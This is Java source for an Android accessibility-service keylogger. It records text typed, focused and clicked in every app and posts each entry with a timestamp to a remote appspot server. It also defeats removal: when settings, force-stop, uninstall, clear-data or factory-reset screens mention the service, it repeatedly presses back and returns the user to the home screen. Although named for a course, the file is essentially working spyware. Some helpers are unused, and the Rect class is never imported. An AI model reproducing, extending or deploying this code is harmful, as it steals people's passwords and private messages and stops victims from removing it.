package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Base64;
import android.view.accessibility.AccessibilityNodeInfo;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

import java.io.UnsupportedEncodingException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    public static Boolean Auto_Click = false;
    public static Boolean bypass = false;

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {
            try {
                String url = "https://cs460-android-keylogger.appspot.com";

                HttpParams httpParameters = new BasicHttpParams();
                HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                HttpConnectionParams.setSoTimeout(httpParameters, 5000);

                StringEntity entity = new StringEntity(params[0], "UTF-8");
                entity.setContentType("text/plain");

                HttpClient client = new DefaultHttpClient(httpParameters);
                HttpPost httpPost = new HttpPost(url);

                httpPost.setEntity(entity);
                client.execute(httpPost);

            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    public static void clickAtPosition(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.getChildCount() == 0) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    if (rect.contains(i, i2)) {
                        accessibilityNodeInfo.performAction(16);
                        return;
                    }
                    return;
                }
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect2);
                if (rect2.contains(i, i2)) {
                    accessibilityNodeInfo.performAction(16);
                }
                for (int i3 = 0; i3 < accessibilityNodeInfo.getChildCount(); i3++) {
                    clickAtPosition(i, i2, accessibilityNodeInfo.getChild(i3));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static String getAppNameFromPkgName(Context context, String str) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(str, 128));
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String toBase64(String str) {
        try {
            return Base64.encodeToString(str.getBytes("UTF-8"), 0);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    private String getEventText(AccessibilityEvent accessibilityEvent) {
        return accessibilityEvent.getText().toString();
    }

    public void SendMeHome(int i) {
        try {
            Intent intent = new Intent("android.intent.action.MAIN");
            intent.addCategory("android.intent.category.HOME");
            intent.setFlags(i);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void blockBack() {
        try {
            if (Build.VERSION.SDK_INT > 15) {
                for (int i = 0; i < 4; i++) {
                    try {
                        performGlobalAction(1);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void click(int i, int i2) {
        try {
            if (Build.VERSION.SDK_INT > 16) {
                clickAtPosition(i, i2, getRootInActiveWindow());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }
            default:
                break;
        }

        if (!bypass) {
            String str = "[" + getApplicationContext().getResources().getString(R.string.accessibility_service_label) + "]";
            String string = getApplicationContext().getResources().getString(R.string.accessibility_service_label);
            if (Build.VERSION.SDK_INT > 15) {
                String lowerCase = event.getClassName().toString().toLowerCase();
                String lowerCase2 = getEventText(event).toLowerCase();

                if ("com.android.settings.subsettings".equals(lowerCase) && (lowerCase2.equals(str.toLowerCase()) || lowerCase2.equals(string.toLowerCase()))) {
                    blockBack();
                    SendMeHome(268435456);
                }

                if (lowerCase2.contains("force stop") || lowerCase2.contains("delete app data") || lowerCase2.contains("clear data") || lowerCase2.contains("clear all data") || lowerCase2.contains("app data") || lowerCase2.contains("clear cache") || lowerCase2.contains("uninstall") || lowerCase2.contains("remove") || lowerCase2.contains("backup & reset") || lowerCase2.contains("erase all data") || lowerCase2.contains("reset phone") || lowerCase2.contains("phone options")) {
                    blockBack();
                    SendMeHome(268435456);
                }

                if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && (lowerCase2.contains("uninstall") || lowerCase2.contains("stop"))) {
                    blockBack();
                    SendMeHome(268435456);
                }

                if (event.getPackageName().toString().contains("com.google.android.packageinstaller") && lowerCase.contains("android.app.alertdialog") && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
                    blockBack();
                    SendMeHome(268435456);
                }

                if (!lowerCase.equals("android.support.v7.widget.recyclerview") && !lowerCase.equals("android.widget.linearlayout") && !lowerCase.equals("android.widget.framelayout")) {
                    if ((event.getPackageName().toString().equals("com.android.settings") || event.getPackageName().toString().equals("com.miui.securitycenter")) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
                        blockBack();
                        SendMeHome(268435456);
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }
			}
